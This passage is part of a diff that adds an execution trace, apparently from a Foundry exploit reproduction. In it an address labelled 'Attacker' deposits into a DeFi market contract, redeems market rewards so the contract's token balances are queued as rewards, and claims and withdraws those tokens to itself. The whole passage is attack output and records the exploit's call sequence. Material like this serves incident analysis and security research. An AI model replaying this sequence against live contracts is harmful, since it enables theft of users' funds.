+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, value: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [216323] 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4::depositMarket(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   ├─ [215525] 0x79D4E26484C6a16531C8c90F8B22af99FeA83ce3::depositMarket(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 458662065591341047289 [4.586e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [207268] 0x6E799758CEE75DAe3d84e09D40dc416eCf713652::depositMarket(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ [206458] 0xFF51c6b493c1E4Df4e491865352353EAdff0f9f8::depositMarket(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [37859] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, value: 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1036] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, value: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3292] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000a650808e0e24a2ec4de6d
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [146187] 0xE688e4e7f07F288949A8B9991197dB174d72f4E3::mint(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [64688] 0x16296859C15289731521F199F0a5f762dF6347d0::beforeReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [63884] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::beforeReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit UpdatePool(param0: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, param1: 1725388499 [1.725e9], param2: 2206161491201766618420 [2.206e21], param3: 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [36081] 0x6Fe9171993A1aFbeAE9b95A42F501DBe25369De0::updateFor(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2540] 0xE688e4e7f07F288949A8B9991197dB174d72f4E3::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [50486] 0x16296859C15289731521F199F0a5f762dF6347d0::afterReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [49682] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::afterReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit NewMarketDeposit(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, param2: 458662065591341047289 [4.586e20], param3: 0xE688e4e7f07F288949A8B9991197dB174d72f4E3, param4: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   │   ├─ emit NewDeposit(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, param2: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   ├─ [3902] 0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57::redeemMarketReward()
+    │   │   │   │   │   │   │   ├─ [3522] 0x7762CbfA8f62999A8A40D800b751686e99A31C9a::redeemMarketReward() [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit MarketClaimReward(param0: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, param1: 0)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   ├─ [727] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::balanceOf(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [779] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::balanceOf(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [3292] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000a650808e0e24a2ec4de6d
+    │   │   │   │   │   │   ├─ [1036] Attacker::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] [0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6]
+    │   │   │   │   │   │   ├─ emit RedeemRewards(param0: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, param1: [0, 0, 0])
+    │   │   │   │   │   │   └─ ← [Return] [0, 0, 0]
+    │   │   │   │   │   ├─ [727] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::balanceOf(0x6E799758CEE75DAe3d84e09D40dc416eCf713652) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1905902020593933340893 [1.905e21]
+    │   │   │   │   │   ├─ [4463] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::approve(0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, 0)
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, spender: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, value: 0)
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [1090] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::allowance(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [22263] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::approve(0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, spender: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, value: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [167449] 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B::queueNewRewards(416513404704868480106 [4.165e20], 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe)
+    │   │   │   │   │   │   ├─ [93113] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::transferFrom(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, spender: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, value: 0)
+    │   │   │   │   │   │   │   ├─ [1102] 0xb1B9150f2085f6a553b547099977181CA802752A::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, to: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, value: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   ├─ [3292] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000a650808e0e24a2ec4de6d
+    │   │   │   │   │   │   │   ├─ [4859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [326] 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 999999999999999000 [9.999e17]
+    │   │   │   │   │   │   ├─ emit RewardAdded(param0: 416513404704868480106 [4.165e20], param1: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe)
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ emit RewardPaidTo(: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, : 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, : 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, : 416513404704868480106 [4.165e20])
+    │   │   │   │   │   ├─ [779] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::balanceOf(0x6E799758CEE75DAe3d84e09D40dc416eCf713652) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2210906430163304577184 [2.21e21]
+    │   │   │   │   │   ├─ [4493] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::approve(0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, 0)
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, spender: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, value: 0)
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [1222] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::allowance(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [22293] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::approve(0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, spender: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, value: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [162697] 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B::queueNewRewards(458662065591341047289 [4.586e20], 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6)
+    │   │   │   │   │   │   ├─ [88361] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::transferFrom(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, spender: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, value: 0)
+    │   │   │   │   │   │   │   ├─ [1036] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, to: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, value: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   ├─ [3292] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000a650808e0e24a2ec4de6d
+    │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [326] 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 999999999999999000 [9.999e17]
+    │   │   │   │   │   │   ├─ emit RewardAdded(param0: 458662065591341047289 [4.586e20], param1: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6)
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ emit RewardPaidTo(: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, : 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, : 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, : 458662065591341047289 [4.586e20])
+    │   │   │   │   │   ├─ [610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(0x6E799758CEE75DAe3d84e09D40dc416eCf713652) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 54711902411635297664 [5.471e19]
+    │   │   │   │   │   ├─ [610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(0x6E799758CEE75DAe3d84e09D40dc416eCf713652) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 54711902411635297664 [5.471e19]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ [244924] 0x16296859C15289731521F199F0a5f762dF6347d0::multiclaim([0x46F6eE9880d08C66DdB22a4645806672CDb1fb61])
+    │   │   │   │   ├─ [244120] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::multiclaim([0x46F6eE9880d08C66DdB22a4645806672CDb1fb61]) [delegatecall]
+    │   │   │   │   │   ├─ [230049] 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B::getReward(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   ├─ [540] 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 999999999999999000 [9.999e17]
+    │   │   │   │   │   │   ├─ [540] 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 999999999999999000 [9.999e17]
+    │   │   │   │   │   │   ├─ [61691] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480105 [4.165e20])
+    │   │   │   │   │   │   │   ├─ [1102] 0xb1B9150f2085f6a553b547099977181CA802752A::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 416513404704868480105 [4.165e20])
+    │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit RewardPaid(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 416513404704868480105 [4.165e20], param3: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe)
+    │   │   │   │   │   │   ├─ [59013] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047288 [4.586e20])
+    │   │   │   │   │   │   │   ├─ [1036] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 458662065591341047288 [4.586e20])
+    │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit RewardPaid(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 458662065591341047288 [4.586e20], param3: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6)
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ [65821] 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4::withdrawMarket(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 416513404704868480106 [4.165e20])
+    │   │   │   │   ├─ [65023] 0x79D4E26484C6a16531C8c90F8B22af99FeA83ce3::withdrawMarket(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 416513404704868480106 [4.165e20]) [delegatecall]
+    │   │   │   │   │   ├─ [58812] 0x6E799758CEE75DAe3d84e09D40dc416eCf713652::withdrawMarket(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   ├─ [58008] 0xFF51c6b493c1E4Df4e491865352353EAdff0f9f8::withdrawMarket(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [23268] 0xd3b6650DE413184C7b3721c8898E4673395417d2::burn(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   ├─ [15200] 0x16296859C15289731521F199F0a5f762dF6347d0::beforeReceiptTokenTransfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   ├─ [14396] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::beforeReceiptTokenTransfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 416513404704868480106 [4.165e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1458] 0x2Da0CdA6f3Ca37eBCba864975278730C0539DA61::updateFor(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   ├─ [3458] 0x2Da0CdA6f3Ca37eBCba864975278730C0539DA61::updateFor(0x0000000000000000000000000000000000000000)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   ├─ [3786] 0x16296859C15289731521F199F0a5f762dF6347d0::afterReceiptTokenTransfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   │   ├─ [2982] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::afterReceiptTokenTransfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 416513404704868480106 [4.165e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   ├─ [25139] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   ├─ [1102] 0xb1B9150f2085f6a553b547099977181CA802752A::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   │   ├─ [3292] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000a650808e0e24a2ec4de6d
+    │   │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit NewMarketWithdraw(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, param2: 416513404704868480106 [4.165e20], param3: 0xd3b6650DE413184C7b3721c8898E4673395417d2, param4: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   ├─ emit NewWithdraw(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, param2: 416513404704868480106 [4.165e20])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
